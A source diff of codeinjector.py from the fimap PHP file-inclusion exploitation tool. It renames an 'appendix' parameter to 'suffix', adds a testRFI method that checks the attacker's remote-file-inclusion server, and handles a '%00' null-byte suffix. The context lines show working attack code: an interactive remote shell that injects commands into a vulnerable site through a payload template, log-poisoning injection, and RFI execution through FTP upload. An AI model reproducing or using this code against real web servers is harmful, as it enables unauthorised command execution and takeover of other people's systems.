@@ -94,10 +94,10 @@ class codeinjector(baseClass):
                 self._log("Testing code thru LocalHTTP->RFI...", self.globSet.LOG_INFO)
                 url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
             else:
-                print "fimap is currently not configured to exploit RFI exploits."
+                print "fimap is currently not configured to exploit RFI vulnerabilitys."
                 sys.exit(1)
 
-        code = self.__doHaxRequest(url, mode, settings["php_info"][0], appendix)
+        code = self.__doHaxRequest(url, mode, settings["php_info"][0], suffix)
         if code == None:
             self._log("php-code testing failed! code=None", self.globSet.LOG_ERROR)
             sys.exit(1)
@@ -116,7 +116,7 @@ class codeinjector(baseClass):
                 elif (mode.find("P") != -1):
                     code = self.doPostRequest(url, testload)
                 elif (mode.find("R") != -1):
-                    code = self.executeRFI(url, appendix, testload)
+                    code = self.executeRFI(url, suffix, testload)
                 elif (mode.find("L") != -1):
                     testload = self.convertUserloadToLogInjection(testload)
                     code = self.doPostRequest(url, testload)
@@ -136,7 +136,7 @@ class codeinjector(baseClass):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
                         pwd_cmd = payload.replace("__PAYLOAD__", "pwd")
-                        curdir = self.__doHaxRequest(url, mode, pwd_cmd, appendix).strip()
+                        curdir = self.__doHaxRequest(url, mode, pwd_cmd, suffix).strip()
                         print shell_banner
 
                         while 1==1:
@@ -145,11 +145,11 @@ class codeinjector(baseClass):
                             
                             if (cmd.strip() != ""):
                                 userload = payload.replace("__PAYLOAD__", "cd '%s'; %s"%(curdir, cmd))
-                                code = self.__doHaxRequest(url, mode, userload, appendix)
+                                code = self.__doHaxRequest(url, mode, userload, suffix)
                                 if (cmd.startswith("cd ")):
                                     cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
                                     cmd = payload.replace("__PAYLOAD__", cmd)
-                                    curdir = self.__doHaxRequest(url, mode, cmd , appendix).strip()
+                                    curdir = self.__doHaxRequest(url, mode, cmd , suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
                         sys.exit(0)
@@ -234,6 +234,48 @@ class codeinjector(baseClass):
         if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
         return(code)
 
+    def testRFI(self):
+        c, r = self.getPHPQuiz()
+        if (settings["dynamic_rfi"]["mode"] == "local"):
+            print "Testing Local->RFI configuration..."
+            code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", c)
+            if (code == c):
+                print "Dynamic RFI works!"
+                print "Testing if you have disabled .php interpreter..."
+                settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ".php"
+                code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ".php", "", "<? %s ?>"%c)
+                if (code == c):
+                    print "ALL OK! You are ready to go!"
+                elif (code == r):
+                    print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"
+            else:
+                print "Failed! Something went wrong..."
+
+
+        elif (settings["dynamic_rfi"]["mode"] == "ftp"):
+            print "Testing FTP->RFI configuration..."
+            code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", c)
+            if (code != None):
+                code = code.strip()
+                if (code == c):
+                    print "Dynamic RFI works!"
+                    print "Testing if you have disabled .php interpreter..."
+                    settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ".php"
+                    code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ".php", "", "<? %s ?>"%c)
+                    if (code == c):
+                        print "ALL OK! You are ready to go!"
+                    elif (code == r):
+                        print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"
+
+                else:
+                    print "Failed! Something went wrong..."
+            else:
+                print "Code == None. That's not good! Failed!"
+        else:
+            print "You haven't enabled and\\or configurated fimap RFI mode."
+            print "Fix that in config.py"
+            
+
     def convertUserloadToLogInjection(self, userload):
         userload = userload.replace("<?", "").replace("?>", "")
         userload = "data=" + b64encode(userload).replace("+", "%2B").replace("=", "%3D")
@@ -283,6 +325,7 @@ class codeinjector(baseClass):
         
         
     def executeRFI(self, URL, appendix, content):
+        if (appendix == "%00"): appendix = ""
         if settings["dynamic_rfi"]["mode"]=="ftp":
             up = self.FTPuploadFile(content, appendix)
             code = self.doGetRequest(URL)
